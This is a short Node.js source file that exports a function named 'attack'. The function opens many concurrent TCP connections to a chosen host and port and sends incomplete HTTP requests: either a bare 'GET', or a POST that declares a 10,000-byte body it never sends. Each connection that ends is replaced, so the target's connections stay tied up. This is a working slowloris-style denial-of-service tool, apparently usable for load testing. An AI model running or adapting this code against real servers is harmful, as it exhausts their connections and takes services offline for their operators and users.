/**
 * Created with JetBrains WebStorm.
 * User: kaven276
 * Date: 13-5-13
 * Time: 下午3:15
 * Transfer-Encoding:chunked\r\n
 * Content-Length:10000\r\n
 */

var net = require('net')
  , Socket = net.Socket
  , ReqLine = "POST ${path} HTTP/1.1\r\nHOST:${host}\r\nContent-Length:10000\r\n\r\n"
//, ReqLine = "GET ${path}/ HTTP/1.1\r\nHOST:${host}\r\n"
  ;

function attack(port, host, concurrency, mode, path){
  var reqLine = ReqLine.replace('${path}', path || '/').replace('${host}', host)
    , runnings = 0
    , no = 0
    , cnt = 0
    , me = this
    ;

  function action(){
    var socket = new Socket()
      , id = ++no
      ;

    socket.on('connect', function(){

      console.log('connected', ++cnt);
      if (mode) {
        socket.write(reqLine);
      } else {
        socket.write('GET');
      }

      // socket.setTimeout(5000);
      socket.on('timeout', function(){
        console.log("NO.%d idle timeout", id);
        socket.destroy();
      });

      socket.on('end', function(data){
        socket.destroy();
        console.log("NO.%d on.end", id);
        runnings--;
        action();
      });

    });

    socket.on('error', function(err){
      console.log("NO.%d", id, err);
      socket.destroy();
      if (err.syscall === "connect" || err.syscall === "getaddrinfo") {
        runnings--;
        action();
      } else {
      }
    });

    runnings++;
    socket.connect(port, host);
    console.log('NO.%d try connect', id, runnings);
  }

  for (var i = 0; i < concurrency; i++) {
    action();
  }
}

exports.attack = attack;




